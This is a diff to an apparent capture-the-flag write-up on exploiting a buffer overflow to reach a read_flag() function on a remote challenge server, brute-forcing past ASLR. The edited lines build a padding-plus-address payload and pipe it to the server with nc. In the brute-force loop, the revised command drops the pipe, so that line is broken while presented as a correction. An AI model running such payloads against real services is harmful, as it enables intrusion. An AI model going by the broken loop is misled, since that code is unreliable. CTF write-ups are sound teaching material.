@@ -10,7 +10,7 @@ I didn't get a screenshot of the output from the server but if you put in a larg
 So next you can try to send a payload with that address and see how it works:
 
 ```
-python -m "print 'A'*120+'\x67\x75\x08'"
+python -c "print 'A'*120+'\x67\x75\x08'" | nc bx10.allyourbases.co 9015
 ```
 
 This will print a similar message as before except you'll see now that the address for the **read_flag()** function has changed. This is because the developers have enabled Address Space Layout Randomization (a common anti-buffer overflow exploit feature). However it appears that the address space is generall pretty small because you may see some addresses repeat.
@@ -20,7 +20,7 @@ So now it just becomes a brute force game where we continue in hopes that the pa
 ```
 for i in {0..100}
 do
-  python -m "print 'A'*120+'\x67\x75\x08'" >> output.txt
+  python -c "print 'A'*120+'\x67\x75\x08'" nc bx10.allyourbases.co 9015 >> output.txt
 done
 ```
 
